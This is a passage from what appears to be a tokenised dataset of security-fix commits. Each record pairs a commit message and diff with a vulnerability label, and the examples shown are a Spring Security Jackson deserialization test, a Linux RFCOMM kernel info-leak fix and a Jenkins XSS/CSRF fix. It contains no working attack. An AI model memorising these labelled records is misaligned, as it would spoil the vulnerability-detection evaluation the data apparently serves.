"ObjectMapper", ".", "DefaultTyping", ".", "NON_FINAL", ",", "JsonTypeInfo", ".", "As", ".", "PROPERTY", ")", ";", "SecurityJackson2Modules", ".", "enableDefaultTyping", "(", "mapper", ")", ";", "String", "content", "=", "\"", "{\\", "\"@", "class", "\\", "\":", "\\\"", "org", ".", "springframework", ".", "security", ".", "jackson2", ".", "SecurityJackson2ModulesTests", "$", "NotWhitelisted", "\\", "\",", "\\\"", "property", "\\", "\":", "\\\"", "bar", "\\", "\"}", "\";", "assertThat", "(", "mapper", ".", "readValue", "(", "content", ",", "Object", ".", "class", ")", ").", "isInstanceOf", "(", "NotWhitelisted", ".", "class", ")", ";", "}", "@", "Test", "public", "void", "readValueWhenAnnotatedThenReadsAsSpecificType", "(", ")", "throws", "Exception", "{", "String", "content", "=", "\"", "{\\", "\"@", "class", "\\", "\":", "\\\"", "org", ".", "springframework", ".", "security", ".", "jackson2", ".", "SecurityJackson2ModulesTests", "$", "NotWhitelistedButAnnotated", "\\", "\",", "\\\"", "property", "\\", "\":", "\\\"", "bar", "\\", "\"}", "\";", "assertThat", "(", "mapper", ".", "readValue", "(", "content", ",", "Object", ".", "class", ")", ").", "isInstanceOf", "(", "NotWhitelistedButAnnotated", ".", "class", ")", ";", "}", "@", "Test", "public", "void", "readValueWhenMixinProvidedThenReadsAsSpecificType", "(", ")", "throws", "Exception", "{", "mapper", ".", "addMixIn", "(", "NotWhitelisted", ".", "class", ",", "NotWhitelistedMixin", ".", "class", ")", ";", "String", "content", "=", "\"", "{\\", "\"@", "class", "\\", "\":", "\\\"", "org", ".", "springframework", ".", "security", ".", "jackson2", ".", "SecurityJackson2ModulesTests", "$", "NotWhitelisted", "\\", "\",", "\\\"", "property", "\\", "\":", "\\\"", "bar", "\\", "\"}", "\";", "assertThat", "(", "mapper", ".", "readValue", "(", "content", ",", "Object", ".", "class", ")", ").", "isInstanceOf", "(", "NotWhitelisted", ".", "class", ")", ";", "}", "@", "Target", "(", "{", "ElementType", ".", "TYPE", ",", "ElementType", ".", "ANNOTATION_TYPE", "}", ")", "@", "Retention", "(", "RetentionPolicy", ".", "RUNTIME", ")", "@", "Documented", "public", "@", "interface", "NotJacksonAnnotation", "{", "}", "@", "NotJacksonAnnotation", "static", "class", "NotWhitelisted", "{", "private", "String", "property", "=", "\"", "bar", "\"", ";", "public", "String", "getProperty", "(", ")", "{", "return", "property", ";", "}", "public", "void", "setProperty", "(", "String", "property", ")", "{", "}", "}", "@", "JsonIgnoreType", "(", "false", ")", "static", "class", "NotWhitelistedButAnnotated", "{", "private", "String", "property", "=", "\"", "bar", "\"", ";", "public", "String", "getProperty", "(", ")", "{", "return", "property", ";", "}", "public", "void", "setProperty", "(", "String", "property", ")", "{", "}", "}", "@", "JsonTypeInfo", "(", "use", "=", "JsonTypeInfo", ".", "Id", ".", "CLASS", ",", "include", "=", "JsonTypeInfo", ".", "As", ".", "PROPERTY", ")", "@", "JsonAutoDetect", "(", "fieldVisibility", "=", "JsonAutoDetect", ".", "Visibility", ".", "ANY", ",", "getterVisibility", "=", "JsonAutoDetect", ".", "Visibility", ".", "NONE", ",", "isGetterVisibility", "=", "JsonAutoDetect", ".", "Visibility", ".", "NONE", ")", "@", "JsonIgnoreProperties", "(", "ignoreUnknown", "=", "true", ")", "abstract", "class", "NotWhitelistedMixin", "{", "}", "}"], "docstring_tokens": ["arbitrary", "code", "execution"]}
{"contents": ["Bluetooth:", "RFCOMM", "-", "Fix", "info", "leak", "in", "ioctl(RFCOMMGETDEVLIST)", "The", "RFCOMM", "code", "fails", "to", "initialize", "the", "two", "padding", "bytes", "of", "struct", "rfcomm_dev_list_req", "inserted", "for", "alignment", "before", "copying", "it", "to", "userland.", "Additionally", "there", "are", "two", "padding", "bytes", "in", "each", "instance", "of", "struct", "rfcomm_dev_info.", "The", "ioctl()", "that", "for", "disclosures", "two", "bytes", "plus", "dev_num", "times", "two", "bytes", "uninitialized", "kernel", "heap", "memory.", "Allocate", "the", "memory", "using", "kzalloc()", "to", "fix", "this", "issue.", "Signed-off-by:", "Mathias", "Krause", "<minipli@googlemail.com>", "Cc:", "Marcel", "Holtmann", "<marcel@holtmann.org>", "Cc:", "Gustavo", "Padovan", "<gustavo@padovan.org>", "Cc:", "Johan", "Hedberg", "<johan.hedberg@gmail.com>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["@", "@", "-", "456", ",", "7", "+", "456", ",", "7", "@", "@", "static", "int", "rfcomm_get_dev_list", "(", "void", "__user", "*", "arg", ")", "size", "=", "sizeof", "(", "*", "dl", ")", "+", "dev_num", "*", "sizeof", "(", "*", "di", ")", ";", "dl", "=", "kmalloc", "(", "size", ",", "GFP_KERNEL", ")", ";", "dl", "=", "kzalloc", "(", "size", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "dl", ")", "return", "-", "ENOMEM", ";"], "docstring_tokens": ["info", "leaks"]}
{"contents": ["[SECURITY-892]"], "code_tokens": ["@", "@", "-", "654", ",", "6", "+", "654", ",", "8", "@", "@", "public", "void", "run", "(", ")", "{", "@", "RequirePOST", "public", "void", "doLaunchSlaveAgent", "(", "StaplerRequest", "req", ",", "StaplerResponse", "rsp", ")", "throws", "IOException", ",", "ServletException", "{", "checkPermission", "(", "CONNECT", ")", ";", "if", "(", "channel", "!", "=", "null", ")", "{", "req", ".", "getView", "(", "this", ",", "\"", "already", "-", "launched", ".", "jelly", "\"", ").", "forward", "(", "req", ",", "rsp", ")", ";", "return", ";"], "docstring_tokens": ["cross-site", "scripting"]}
{"contents": ["Aligned", "with", "wicket8.x"], "code_tokens": ["@", "@", "-", "18", ",", "7", "+", "18", ",", "7", "@", "@", "Once", "done", ",", "just", "include", "the", "jar", "(", "s", ")", "in", "your", "project", "'", "s", "build", "path", ".", "<", "dependency", ">", "<", "groupId", ">", "com", ".", "googlecode", ".", "wicket", "-", "jquery", "-", "ui", "<", "/", "groupId", ">", "<", "artifactId", ">", "wicket", "-", "jquery", "-", "ui", "<", "/", "artifactId", ">", "<", "version", ">", "7", ".", "8", ".", "0", "<", "/", "version", ">", "<", "version", ">", "7", ".", "9", ".", "0", "<", "/", "version", ">", "<", "/", "dependency", ">", "`", "``", "@", "@", "-", "48", ",", "7", "+", "48", ",", "6", "@", "@", "If", "the", "version", "you", "specified", "is", "*", "snapshot", "*", ",", "you", "might", "define", "this", "repository", ":", "<", "tr", ">", "<", "td", ">", "8", ".", "0", ".", "0", "-", "M3", "<", "/", "td", ">", "<", "td", ">", "8", ".", "0", ".", "0", "-", "M3", "<", "/", "td", ">", "<", "td", ">", "1", ".", "12", ".", "1", "<", "/", "td", ">", "</", "tr", ">", "<", "tr", ">", "<", "td", ">", "8", ".", "0", ".", "0", "-", "M2", "<", "/", "td", ">", "<", "td", ">", "8", ".", "0", ".", "0", "-", "M2", "<", "/", "td", ">", "<", "td", ">", "1", ".", "12", ".", "0", "<", "/", "td", ">", "</", "tr", ">", "<", "tr", ">", "<", "td", ">", "8", ".", "0", ".", "0", "-", "M1", "<", "/", "td", ">", "<", "td", ">", "8", ".", "0", ".", "0", "-", "M1", "<", "/", "td", ">", "<", "td", ">", "1", ".", "12", ".", "0", "<", "/", "td", ">", "</", "tr", ">", "<", "tr", ">", "<", "td", ">", "7", ".", "9", ".", "1", "<", "/", "td", ">", "<", "td", ">", "7", ".", "9", ".", "1", "<", "/", "td", ">", "<", "td", ">", "1", ".", "12", ".", "1", "<", "/", "td", ">", "</", "tr", ">", "<", "tr", ">", "<", "td", ">", "7", ".", "9", ".", "0", "<", "/", "td", ">", "<", "td", ">", "7", ".", "9", ".", "0", "<", "/", "td", ">", "<", "td", ">", "1", ".", "12", ".", "1", "<", "/", "td", ">", "</", "tr", ">", "<", "tr", ">", "<", "td", ">", "7", ".", "8", ".", "0", "<", "/", "td", ">", "<", "td", ">", "7", ".", "8", ".", "0", "<", "/", "td", ">", "<", "td", ">", "1", ".", "12", ".", "1", "<", "/", "td", ">", "</", "tr", ">", "<", "tr", ">", "<", "td", ">", "7", ".", "7", ".", "0", "<", "/", "td", ">", "<", "td", ">", "7", ".", "7", ".", "0", "<", "/", "td", ">", "<", "td", ">", "1", ".", "12", ".", "1", "<", "/", "td", ">", "</", "tr", ">", "@", "@", "-", "96", ",", "6", "+", "95", ",", "7", "@", "@", "If", "the", "version", "you", "specified", "is", "*", "snapshot", "*", ",", "you", "might", "define", "this", "repository", ":", "<", "tr", ">", "<", "td", ">", "8", ".", "0", ".", "0", "-", "M3", "<", "/", "td", ">", "<", "td", ">", "8", ".", "0", ".", "0", "-", "M3", "<", "/", "td", ">", "<", "td", ">", "2016", ".", "3", ".", "1118", "(", "ASFv2", ")", "</", "td", ">", "</", "tr", ">", "<", "tr", ">", "<", "td", ">", "8", ".", "0", ".", "0", "-", "M2", "<", "/", "td", ">", "<", "td", ">", "8", ".", "0", ".", "0", "-", "M2", "<", "/", "td", ">", "<", "td", ">", "2016", ".", "3", ".", "1028", "(", "ASFv2", ")", "</", "td", ">", "</", "tr", ">", "<", "tr", ">", "<", "td", ">", "8", ".", "0", ".", "0", "-", "M1", "<", "/", "td", ">", "<", "td", ">", "8", ".", "0", ".", "0", "-", "M1", "<", "/", "td", ">", "<", "td", ">", "2016", ".", "2", ".", "714", "(", "ASFv2", ")", "</", "td", ">", "</", "tr", ">", "<", "tr", ">", "<", "td", ">", "7", ".", "9", ".", "0", "<", "/", "td", ">", "<", "td", ">", "7", ".", "9", ".", "0", "<", "/", "td", ">", "<", "td", ">", "2017", ".", "2", ".", "621", "(", "ASFv2", ")", "</", "td", ">", "</", "tr", ">", "<", "tr", ">", "<", "td", ">", "7", ".", "8", ".", "0", "<", "/", "td", ">", "<", "td", ">", "7", ".", "8", ".", "0", "<", "/", "td", ">", "<", "td", ">", "2017", ".", "2", ".", "621", "(", "ASFv2", ")", "</", "td", ">", "</", "tr", ">", "<", "tr", ">", "<", "td", ">", "7", ".", "7", ".", "0", "<", "/", "td", ">", "<", "td", ">", "7", ".", "7", ".", "0", "<", "/", "td", ">", "<", "td", ">", "2017", ".", "1", ".", "223", "(", "ASFv2", ")", "</", "td", ">", "</", "tr", ">", "<", "tr", ">", "<", "td", ">", "7", ".", "6", ".", "0", "<", "/", "td", ">", "<", "td", ">", "7", ".", "6", ".", "0", "<", "/", "td", ">", "<", "td", ">", "2016", ".", "3", ".", "1118", "(", "ASFv2", ")", "</", "td", ">", "</", "tr", ">", "@", "@", "-", "142", ",", "7", "+", "142", ",", "7", "@", "@", "To", "use", "wicket", "-", "jquery", "-", "ui", "with", "a", "standard", "theme", ",", "just", "add", "the", "corresponding", "theme", "<", "dependency", ">", "<", "groupId", ">", "com", ".", "googlecode", ".", "wicket", "-", "jquery", "-", "ui", "<", "/", "groupId", ">", "<", "artifactId", ">", "wicket", "-", "jquery", "-", "ui", "-", "theme", "-", "uilightness", "<", "/", "artifactId", ">", "<", "version", ">", "7", ".", "8", ".", "0", "<", "/", "version", ">", "<", "version", ">", "7", ".", "9", ".", "0", "<", "/", "version", ">", "<", "/", "dependency", ">", "`", "``", "@", "@", "-", "24", ",", "7", "+", "24", ",", "9", "@", "@", "*", "*", "@", "author", "Sebastien", "Briquet", "-", "sebfz1", "*", "@", "see", "Component", "#", "send", "(", "org", ".", "apache", ".", "wicket", ".", "event", ".", "IEventSink", ",", "org", ".", "apache", ".", "wicket", ".", "event", ".", "Broadcast", ",", "Object", ")", "*", "@", "deprecated", "use", "{", "@", "link", "HandlerPayload", "}", "instead", "*", "/", "@", "Deprecated", "public", "class", "AjaxPayload", "{", "private", "final", "AjaxRequestTarget", "target", ";", "@", "@", "-", "18", ",", "6", "+", "18", ",", "7", "@", "@", "import", "org", ".", "apache", ".", "wicket", ".", "Component", ";", "import", "org", ".", "apache", ".", "wicket", ".", "ajax", ".", "AjaxRequestTarget", ";", "import", "org", ".", "apache", ".", "wicket", ".", "core", ".", "request", ".", "handler", ".", "IPartialPageRequestHandler", ";", "import", "org", ".", "apache", ".", "wicket", ".", "feedback", ".", "FeedbackMessage", ";", "/", "**", "@", "@", "-", "33", ",", "15", "+", "34", ",", "15", "@", "@", "*", "if", "(", "event", ".", "getPayload", "(", ")", "instanceof", "FeedbackPayload", ")", "*", "{", "*", "FeedbackPayload", "payload", "=", "(", "FeedbackPayload", ")", "event", ".", "getPayload", "(", ");", "*", "IPartialPageRequestHandler", "handler", "=", "payload", ".", "getHandler", "(", ");", "*", "String", "message", "=", "payload", ".", "getMessage", "(", ");", "*", "AjaxRequestTarget", "target", "=", "payload", ".", "getTarget", "(", ");", "*", "*", "if", "(", "payload", ".", "getLevel", "(", ")", "=", "=", "FeedbackMessage", ".", "DEBUG", ")", "*", "{", "*", "this", ".", "debug", "(", "message", ")", ";", "*", "}", "*", "*", "target", ".", "add", "(", "feedback", ")", ";", "*", "handler", ".", "add", "(", "feedback", ")", ";", "*", "}", "*", "}", "*", "<", "/", "code", ">", "@", "@", "-", "51", ",", "31", "+", "52", ",", "31", "@", "@", "*", "@", "see", "Component", "#", "send", "(", "org", ".", "apache", ".", "wicket", ".", "event", ".", "IEventSink", ",", "org", ".", "apache", ".", "wicket", ".", "event", ".", "Broadcast", ",", "Object", ")", "*", "*", "/", "public", "class", "FeedbackPayload", "extends", "AjaxPayload", "public", "class", "FeedbackPayload", "extends", "HandlerPayload", "{", "private", "final", "String", "message", ";", "private", "final", "int", "level", ";", "/", "**", "*", "Constructor", ",", "designed", "to", "only", "refresh", "*", "*", "@", "param", "target", "the", "{", "@", "link", "AjaxRequestTarget", "}", "*", "@", "param", "handler", "the", "{", "@", "link", "AjaxRequestTarget", "}", "*", "/", "public", "FeedbackPayload", "(", "AjaxRequestTarget", "target", ")", "public", "FeedbackPayload", "(", "IPartialPageRequestHandler", "handler", ")", "{", "this", "(", "target", ",", "FeedbackMessage", ".", "UNDEFINED", ",", "null", ")", ";", "this", "(", "handler", ",", "FeedbackMessage", ".", "UNDEFINED", ",", "null", ")", ";", "}", "/", "**", "*", "Constructor", "*", "*", "@", "param", "target", "the", "{", "@", "link", "AjaxRequestTarget", "}", "*", "@", "param", "handler", "the", "{", "@", "link", "AjaxRequestTarget", "}", "*", "@", "param", "level", "the", "level", "(", "ie", ":", "{", "@", "link", "FeedbackMessage", "#", "INFO", "}", ",", "etc", ")", "*", "@", "param", "message", "the", "message", "*", "/", "public", "FeedbackPayload", "(", "AjaxRequestTarget", "target", ",", "int", "level", ",", "String", "message", ")", "public", "FeedbackPayload", "(", "IPartialPageRequestHandler", "handler", ",", "int", "level", ",", "String", "message", ")", "{", "super", "(", "target", ")", ";", "super", "(", "handler", ")", ";", "this", ".", "level", "=", "level", ";", "this", ".", "message", "=", "message", ";", "@", "@", "-", "17", ",", "12", "+", "17", ",", "15", "@", "@", "package", "com", ".", "googlecode", ".", "wicket", ".", "jquery", ".", "core", ".", "utils", ";", "import", "org", ".", "apache", ".", "wicket", ".", "Component", ";", "import", "org", ".", "apache", ".", "wicket", ".", "Page", ";", "import", "org", ".", "apache", ".", "wicket", ".", "core", ".", "request", ".", "handler", ".", "IPartialPageRequestHandler", ";", "import", "org", ".", "apache", ".", "wicket", ".", "event", ".", "Broadcast", ";", "import", "com", ".", "googlecode", ".", "wicket", ".", "jquery", ".", "core", ".", "ajax", ".", "AjaxPayload", ";", "import", "com", ".", "googlecode", ".", "wicket", ".", "jquery", ".", "core", ".", "ajax", ".", "HandlerPayload", ";", "/", "**", "*", "Utility", "class", "for", "handling", "for", "broadcasting", "{", "@", "link", "AjaxPayload", "}", "{@", "code", "s", "}", "*", "Utility", "class", "for", "handling", "for", "broadcasting", "{", "@", "link", "HandlerPayload", "}", "{@", "code", "s", "}", "*", "*", "@", "author", "Sebastien", "Briquet", "-", "sebfz1", "*", "@", "@", "-", "43", ",", "41", "+", "46", ",", "133", "@", "@", "private", "BroadcastUtils", "(", ")", "*", "@", "param", "component", "the", "sink", "{", "@", "link", "Component", "}", ",", "likely", "a", "page", "*", "@", "param", "payload", "the", "{", "@", "link", "AjaxPayload", "}", "*", "/", "@", "Deprecated", "public", "static", "void", "breadth", "(", "Component", "component", ",", "AjaxPayload", "payload", ")", "{", "component", ".", "send", "(", "component", ",", "Broadcast", ".", "BREADTH", ",", "payload", ")", ";", "}", "/", "**", "*", "Sends", "an", "{", "@", "link", "HandlerPayload", "}", "in", "{", "@", "link", "Broadcast", "#", "BREADTH", "}", "mode", "*", "*", "@", "param", "component", "the", "sink", "{", "@", "link", "Component", "}", ",", "likely", "a", "page", "*", "@", "param", "payload", "the", "{", "@", "link", "HandlerPayload", "}", "*", "/", "public", "static", "void", "breadth", "(", "Component", "component", ",", "HandlerPayload", "payload", ")", "{", "component", ".", "send", "(", "component", ",", "Broadcast", ".", "BREADTH", ",", "payload", ")", ";", "}", "/", "**", "*", "Sends", "an", "{", "@", "link", "HandlerPayload", "}", "in", "{", "@", "link", "Broadcast", "#", "BREADTH", "}", "mode", "*", "*", "@", "param", "handler", "the", "{", "@", "link", "IPartialPageRequestHandler", "}", "holding", "the", "sink", "{", "@", "link", "Page", "}", "*", "@", "param", "payload", "the", "{", "@", "link", "HandlerPayload", "}", "*", "/", "public", "static", "void", "breadth", "(", "IPartialPageRequestHandler", "handler", ",", "HandlerPayload", "payload", ")", "{", "BroadcastUtils", ".", "breadth", "(", "(", "Page", ")", "handler", ".", "getPage", "(", "),", "payload", ")", ";", "}", "/", "**", "*", "Sends", "an", "{", "@", "link", "AjaxPayload", "}", "in", "{", "@", "link", "Broadcast", "#", "BUBBLE", "}", "mode", "*", "*", "@", "param", "component", "the", "sink", "{", "@", "link", "Component", "}", "*", "@", "param", "payload", "the", "{", "@", "link", "AjaxPayload", "}", "*", "/", "@", "Deprecated", "public", "static", "void", "bubble", "(", "Component", "component", ",", "AjaxPayload", "payload", ")", "{", "component", ".", "send", "(", "component", ",", "Broadcast", ".", "BUBBLE", ",", "payload", ")", ";", "}", "/", "**", "*", "Sends", "an", "{", "@", "link", "HandlerPayload", "}", "in", "{", "@", "link", "Broadcast", "#", "BUBBLE", "}", "mode", "*", "*", "@", "param", "component", "the", "sink", "{", "@", "link", "Component", "}", "*", "@", "param", "payload", "the", "{", "@", "link", "HandlerPayload", "}", "*", "/", "public", "static", "void", "bubble", "(", "Component", "component", ",", "HandlerPayload", "payload", ")", "{", "component", ".", "send", "(", "component", ",", "Broadcast", ".", "BUBBLE", ",", "payload", ")", ";", "}", "/", "**", "*", "Sends", "an", "{", "@", "link", "HandlerPayload", "}", "in", "{", "@", "link", "Broadcast", "#", "BUBBLE", "}", "mode", "*", "*", "@", "param", "handler", "the", "{", "@", "link", "IPartialPageRequestHandler", "}", "holding", "the", "sink", "{", "@", "link", "Page", "}", "*", "@", "param", "payload", "the", "{", "@", "link", "HandlerPayload", "}", "*", "/", "public", "static", "void", "bubble", "(", "IPartialPageRequestHandler", "handler", ",", "HandlerPayload", "payload", ")", "{", "BroadcastUtils", ".", "bubble", "(", "(", "Page", ")", "handler", ".", "getPage", "(", "),", "payload", ")", ";", "}", "/", "**", "*", "Sends", "an", "{", "@", "link", "AjaxPayload", "}", "in", "{", "@", "link", "Broadcast", "#", "DEPTH", "}", "mode", "*", "*", "@", "param", "component", "the", "sink", "{", "@", "link", "Component", "}", "*", "@", "param", "payload", "the", "{", "@", "link", "AjaxPayload", "}", "*", "/", "@", "Deprecated", "public", "static", "void", "depth", "(", "Component", "component", ",", "AjaxPayload", "payload", ")", "{", "component", ".", "send", "(", "component", ",", "Broadcast", ".", "DEPTH", ",", "payload", ")", ";", "}", "/", "**", "*", "Sends", "an", "{", "@", "link", "HandlerPayload", "}", "in", "{", "@", "link", "Broadcast", "#", "DEPTH", "}", "mode", "*", "*", "@", "param", "component", "the", "sink", "{", "@", "link", "Component", "}", "*", "@", "param", "payload", "the", "{", "@", "link", "HandlerPayload", "}", "*", "/", "public", "static", "void", "depth", "(", "Component", "component", ",", "HandlerPayload", "payload", ")", "{", "component", ".", "send", "(", "component", ",", "Broadcast", ".", "DEPTH", ",", "payload", ")", ";", "}", "/", "**", "*", "Sends", "an", "{", "@", "link", "HandlerPayload", "}", "in", "{", "@", "link", "Broadcast", "#", "DEPTH", "}", "mode", "*", "*", "@", "param", "handler", "the", "{", "@", "link", "IPartialPageRequestHandler", "}", "holding", "the", "sink", "{", "@", "link", "Page", "}", "*", "@", "param", "payload", "the", "{", "@", "link", "HandlerPayload", "}", "*", "/", "public", "static", "void", "depth", "(", "IPartialPageRequestHandler", "handler", ",", "HandlerPayload", "payload", ")", "{", "BroadcastUtils", ".", "depth", "(", "(", "Page", ")", "handler", ".", "getPage", "(", "),", "payload", ")", ";", "}", "/", "**", "*", "Sends", "an", "{", "@", "link", "AjaxPayload", "}", "in", "{", "@", "link", "Broadcast", "#", "EXACT", "}", "mode", "*", "*", "@", "param", "component", "the", "sink", "{", "@", "link", "Component", "}", "*", "@", "param", "payload", "the", "{", "@", "link", "AjaxPayload", "}", "*", "/", "@", "Deprecated", "public", "static", "void", "exact", "(", "Component", "component", ",", "AjaxPayload", "payload", ")", "{", "component", ".", "send", "(", "component", ",", "Broadcast", ".", "EXACT", ",", "payload", ")", ";", "}", "/", "**", "*", "Sends", "an", "{", "@", "link", "HandlerPayload", "}", "in", "{", "@", "link", "Broadcast", "#", "EXACT", "}", "mode", "*", "*", "@", "param", "component", "the", "sink", "{", "@", "link", "Component", "}", "*", "@", "param", "payload", "the", "{", "@", "link", "HandlerPayload", "}", "*", "/", "public", "static", "void", "exact", "(", "Component", "component", ",", "HandlerPayload", "payload", ")", "{", "component", ".", "send", "(", "component", ",", "Broadcast", ".", "EXACT", ",", "payload", ")", ";", "}", "/", "**", "*", "Sends", "an", "{", "@", "link", "HandlerPayload", "}", "in", "{", "@", "link", "Broadcast", "#", "EXACT", "}", "mode", "*", "*", "@", "param", "handler", "the", "{", "@", "link", "IPartialPageRequestHandler", "}", "holding", "the", "sink", "{", "@", "link", "Page", "}", "*", "@", "param", "payload", "the", "{", "@", "link", "HandlerPayload", "}", "*", "/", "public", "static", "void", "exact", "(", "IPartialPageRequestHandler", "handler", ",", "HandlerPayload", "payload", ")", "{", "BroadcastUtils", ".", "exact", "(", "(", "Page", ")", "handler", ".", "getPage", "(", "),", "payload", ")", ";", "}", "}", "@", "@", "-", "16", ",", "8", "+", "16", ",", "7", "@", "@", "*", "/", "package", "com", ".", "googlecode", ".", "wicket", ".", "jquery", ".", "core", ".", "utils", ";", "import", "org", ".", "apache", ".", "wicket", ".", "Component", ";", "import", "org", ".", "apache", ".", "wicket", ".", "ajax", ".", "AjaxRequestTarget", ";", "import", "org", ".", "apache", ".", "wicket", ".", "core", ".", "request", ".", "handler", ".", "IPartialPageRequestHandler", ";", "import", "org", ".", "apache", ".", "wicket", ".", "event", ".", "Broadcast", ";", "import", "org", ".", "apache", ".", "wicket", ".", "feedback", ".", "FeedbackMessage", ";", "import", "org", ".", "apache", ".", "wicket", ".", "markup", ".", "html", ".", "panel", ".", "FeedbackPanel", ";", "@", "@", "-", "28", ",", "6", "+", "27", ",", "7", "@", "@", "/", "**", "*", "Utility", "class", "for", "handling", "feedback", "session", "messages", "and", "feedback", "ajax", "messages", ".", "<", "br", ">", "*", "The", "hosting", "page", "should", "implement", "a", "code", "like", ":", "*", "*", "<", "pre", ">", "*", "<", "code", ">", "*", "public", "void", "onEvent", "(", "IEvent", "&", "lt", ";", "?&", "gt", ";", "event", ")", "@", "@", "-", "41", ",", "7", "+", "41", ",", "7", "@", "@", "*", "if", "(", "payload", ".", "getLevel", "(", ")", "=", "=", "FeedbackMessage", ".", "INFO", ")", "*", "{", "*", "this", ".", "info", "(", "payload", ".", "getMessage", "(", "))", ";", "*", "payload", ".", "getTarget", "(", ").", "add", "(", "this", ".", "feedbackPanel", ")", ";", "*", "payload", ".", "getHandler", "(", ").", "add", "(", "this", ".", "feedbackPanel", ")", ";", "*", "}", "*", "}", "*", "}", "@", "@", "-", "61", ",", "224", "+", "61", ",", "265", "@", "@", "private", "FeedbackUtils", "(", ")", "/", "/", "noop", "}", "/", "/", "Session", "based", "/", "/", "/", "**", "*", "Register", "a", "debug", "at", "session", "level", "so", "the", "message", "is", "available", "even", "if", "the", "page", "is", "redirected", "*", "Aims", "to", "reload", "a", "{", "@", "link", "FeedbackPanel", "}", "using", "{", "@", "link", "Broadcast", "#", "BREADTH", "}", "mode", ".", "<", "br", ">", "*", "The", "hosting", "page", "should", "implement", "a", "code", "like", ":", "<", "br", ">", "*", "*", "@", "param", "message", "the", "message", "*", "<", "pre", ">", "*", "<", "code", ">", "*", "public", "void", "onEvent", "(", "IEvent", "&", "lt", ";", "?&", "gt", ";", "event", ")", "*", "{", "*", "super", ".", "onEvent", "(", "event", ")", ";", "*", "*", "if", "(", "event", ".", "getPayload", "(", ")", "instanceof", "FeedbackPayload", ")", "*", "{", "*", "FeedbackPayload", "payload", "=", "(", "FeedbackPayload", ")", "event", ".", "getPayload", "(", ");", "*", "*", "if", "(", "payload", ".", "getLevel", "(", ")", "=", "=", "FeedbackMessage", ".", "UNDEFINED", ")", "*", "{", "*", "payload", ".", "getHandler", "(", ").", "add", "(", "this", ".", "feedbackPanel", ")", ";", "*", "}", "*", "}", "*", "}", "*", "<", "/", "code", ">", "*", "<", "/", "pre", ">", "*", "*", "@", "param", "handler", "the", "{", "@", "link", "IPartialPageRequestHandler", "}", "*", "/", "public", "static", "void", "debug", "(", "String", "message", ")", "public", "static", "void", "reload", "(", "IPartialPageRequestHandler", "handler", ")", "{", "WebSession", ".", "get", "(", ").", "debug", "(", "message", ")", ";", "BroadcastUtils", ".", "breadth", "(", "handler", ",", "new", "FeedbackPayload", "(", "handler", ")", ");", "}", "/", "**", "*", "Register", "an", "info", "at", "session", "level", "so", "the", "message", "is", "available", "even", "if", "the", "page", "is", "redirected", "*", "Register", "a", "debug", "at", "session", "level", "so", "the", "message", "is", "available", "even", "if", "the", "page", "is", "redirected", "*", "*", "@", "param", "message", "the", "message", "*", "/", "public", "static", "void", "info", "(", "String", "message", ")", "public", "static", "void", "debug", "(", "String", "message", ")", "{", "WebSession", ".", "get", "(", ").", "info", "(", "message", ")", ";", "IPartialPageRequestHandler", "handler", "=", "RequestCycleUtils", ".", "getRequestHandler", "(", ");", "if", "(", "handler", "!", "=", "null", ")", "{", "FeedbackUtils", ".", "debug", "(", "handler", ",", "message", ")", ";", "}", "else", "{", "WebSession", ".", "get", "(", ").", "debug", "(", "message", ")", ";", "}", "}", "/", "**", "*", "Register", "a", "success", "at", "session", "level", "so", "the", "message", "is", "available", "even", "if", "the", "page", "is", "redirected", "*", "Sends", "an", "ajax", "{", "@", "link", "FeedbackMessage", "#", "DEBUG", "}", "message", "to", "the", "hosting", "page", "*", "*", "@", "param", "handler", "the", "{", "@", "link", "IPartialPageRequestHandler", "}", "*", "@", "param", "message", "the", "message", "*", "/", "public", "static", "void", "success", "(", "String", "message", ")", "public", "static", "void", "debug", "(", "IPartialPageRequestHandler", "handler", ",", "String", "message", ")", "{", "WebSession", ".", "get", "(", ").", "success", "(", "message", ")", ";", "BroadcastUtils", ".", "breadth", "(", "handler", ",", "new", "FeedbackPayload", "(", "handler", ",", "FeedbackMessage", ".", "DEBUG", ",", "message", ")", ");", "}", "/", "**", "*", "Register", "a", "warn", "at", "session", "level", "so", "the", "message", "is", "available", "even", "if", "the", "page", "is", "redirected", "*", "Register", "an", "info", "at", "session", "level", "so", "the", "message", "is", "available", "even", "if", "the", "page", "is", "redirected", "*", "*", "@", "param", "e", "the", "{", "@", "link", "Exception", "}", "*", "@", "param", "message", "the", "message", "*", "/", "public", "static", "void", "warn", "(", "Exception", "e", ")", "public", "static", "void", "info", "(", "String", "message", ")", "{", "FeedbackUtils", ".", "warn", "(", "e", ".", "getMessage", "(", "))", ";", "IPartialPageRequestHandler", "handler", "=", "RequestCycleUtils", ".", "getRequestHandler", "(", ");", "if", "(", "handler", "!", "=", "null", ")", "{", "FeedbackUtils", ".", "info", "(", "handler", ",", "message", ")", ";", "}", "else", "{", "WebSession", ".", "get", "(", ").", "info", "(", "message", ")", ";", "}", "}", "/", "**", "*", "Register", "a", "warn", "at", "session", "level", "so", "the", "message", "is", "available", "even", "if", "the", "page", "is", "redirected", "*", "Sends", "an", "ajax", "{", "@", "link", "FeedbackMessage", "#", "INFO", "}", "message", "to", "the", "hosting", "page", "*", "*", "@", "param", "handler", "the", "{", "@", "link", "IPartialPageRequestHandler", "}", "*", "@", "param", "message", "the", "message", "*", "/", "public", "static", "void", "warn", "(", "String", "message", ")", "public", "static", "void", "info", "(", "IPartialPageRequestHandler", "handler", ",", "String", "message", ")", "{", "WebSession", ".", "get", "(", ").", "warn", "(", "message", ")", ";", "BroadcastUtils", ".", "breadth", "(", "handler", ",", "new", "FeedbackPayload", "(", "handler", ",", "FeedbackMessage", ".", "INFO", ",", "message", ")", ");", "}", "/", "**", "*", "Register", "an", "error", "at", "session", "level", "so", "the", "message", "is", "available", "even", "if", "the", "page", "is", "redirected", "*", "Register", "a", "success", "at", "session", "level", "so", "the", "message", "is", "available", "even", "if", "the", "page", "is", "redirected", "*", "*", "@", "param", "e", "the", "{", "@", "link", "Exception", "}", "*", "@", "param", "message", "the", "message", "*", "/", "public", "static", "void", "error", "(", "Exception", "e", ")", "public", "static", "void", "success", "(", "String", "message", ")", "{", "FeedbackUtils", ".", "error", "(", "e", ".", "getMessage", "(", "))", ";", "IPartialPageRequestHandler", "handler", "=", "RequestCycleUtils", ".", "getRequestHandler", "(", ");", "if", "(", "handler", "!", "=", "null", ")", "{", "FeedbackUtils", ".", "success", "(", "handler", ",", "message", ")", ";", "}", "else", "{", "WebSession", ".", "get", "(", ").", "success", "(", "message", 